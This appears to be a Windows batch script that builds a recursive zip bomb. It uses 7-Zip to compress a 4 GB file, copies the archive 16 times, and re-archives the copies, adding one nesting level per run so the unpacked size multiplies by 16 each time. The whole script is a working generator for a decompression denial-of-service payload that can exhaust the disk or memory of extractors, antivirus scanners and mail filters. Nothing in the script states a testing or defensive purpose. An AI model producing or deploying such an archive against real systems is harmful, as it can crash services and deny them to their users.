@ECHO OFF
REM Make sure we are in the correct directory (our own)
CD /D %~dp0
REM Check basic requirements
IF NOT EXIST 7z.exe GOTO NO7Z
IF NOT EXIST 7z.dll GOTO NO7Z
IF NOT EXIST 4G.bin GOTO NOBIN
IF NOT EXIST arc MD arc
IF NOT EXIST 4G.zip GOTO DOBASIC
IF NOT EXIST Base.zip GOTO DOBASIC
GOTO DOLEVEL

REM 7-zip is missing
:NO7Z
ECHO Can't locate 7z.exe and/or 7z.dll.
ECHO Either grab the repository again or install 7-zip (http://7-zip.org).
ECHO If you go for the installation,
ECHO you can copy both files from the 7-zip installation folder.
PAUSE
GOTO END

REM If the 4G.bin was not found
:NOBIN
ECHO Extract or create the file 4G.BIN before starting
PAUSE
GOTO END

REM Create an additional level of zip archives.
:DOLEVEL
IF NOT EXIST arc\0.zip GOTO FILLDIR
DEL Base.zip
7z a Base.zip .\arc\*.zip
DEL .\arc\*.zip
ECHO Done. Execute again for an additional level
PAUSE
GOTO END

REM Create the basic infrastructure (4GB.zip and Base.zip)
:DOBASIC
ECHO Creating Base archive
IF NOT EXIST 4G.zip 7z.exe a 4G.zip 4G.bin
COPY /Y 4G.zip Base.zip
GOTO FILLDIR

REM Fill the "arc" directory with 16 copies of Base.zip
:FILLDIR
COPY /Y Base.zip arc\0.zip
PUSHD .\ARC
COPY /Y 0.zip 1.zip
COPY /Y 0.zip 2.zip
COPY /Y 0.zip 3.zip
COPY /Y 0.zip 4.zip
COPY /Y 0.zip 5.zip
COPY /Y 0.zip 6.zip
COPY /Y 0.zip 7.zip
COPY /Y 0.zip 8.zip
COPY /Y 0.zip 9.zip
COPY /Y 0.zip A.zip
COPY /Y 0.zip B.zip
COPY /Y 0.zip C.zip
COPY /Y 0.zip D.zip
COPY /Y 0.zip E.zip
COPY /Y 0.zip F.zip
POPD
GOTO DOLEVEL

:END
